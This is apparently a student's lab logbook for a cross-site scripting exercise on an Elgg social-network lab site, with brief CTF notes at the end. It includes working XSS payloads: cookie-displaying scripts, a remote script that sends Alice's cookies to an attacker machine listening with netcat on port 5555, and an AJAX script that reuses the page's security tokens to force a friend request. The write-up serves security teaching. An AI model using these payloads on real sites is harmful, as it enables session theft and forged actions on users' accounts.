# Trabalho realizado na Semana #10 
# LOGBOOK 10

## Indíce
- Task 1
  
- Task 2
  
- Task 3
  
- Task 4

# Task 1
For this first task we updated brief description of Boby profile to '<script>alert('XSS');</script>', loged out and searched for boby with alice signed in. When we clicked on Boby profile de alert message appeared.

![bobyXSS](/outputs/log10/firstXSS.png)

# Task 2
This task was similar to the last one, with the difference of the script types in the profile. This time we changed the brief description of Boby to '<script>alert(document.cookie);</script>' and then the cookies where shown if we visited the page.

![cookiesXSS1](/outputs/log10/cookiesXSS1.png)

# Task 3
For this task we updated Boby's profile to '<script type="text/javascript"src="http://www.xample.com/myscripts.js"></script>'. This script sends a HTTP GET request to the attacker's machine in port 5555. Because of this, in the terminal we run "nc -lknv 5555" (command to listen to port 5555) and when we visited Boby's profile with Aliced loged in, we recieved Alice' cookies in the attacker's terminal

![cookieStealing](/outputs/log10/cookieStealing.png)

# Task 4
For this task we started by loggin in with Alice, going to Samy's profile and analizing with the browser the requrst sent when we clicked "add friend".

![addSamy](/outputs/log10/addSamy.png)

with this information, we updated the given js script to :
<script type="text/javascript">
window.onload = function () {
var Ajax=null;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;
//Construct the HTTP request to add Samy as a friend.
var sendurl="http://www.seed-server.com/action/friends/add?friend=59"+ts+token;
//Create and send Ajax request to add friend
Ajax=new XMLHttpRequest();
Ajax.open("GET", sendurl, true);
Ajax.send();
}
</script>

and pasted this into Samy's profile.
After this we logged in Boby's account and when we visited Samy's profile, he was automatically added.

![samyFriend](/outputs/log10/samyFriend.png)

- Question 1:
They are needed to provide information and identify the agent that is adding Samy as a friend.

- Question 2:
If we can point to some external resource that executes the code we want, we do not need text mode.


# CTFs
## Desafio 1:
- Colocar script no local de input que prime botao give flag e esperar que flag seja devolvida.
<script>
    element1=document.getElementById('giveflag');
    element1.click();
</script>

## Desafio 2:
- gets(buffer); é a vulnerabilidade
- permite injeção de codigo para além do espaço do buffer

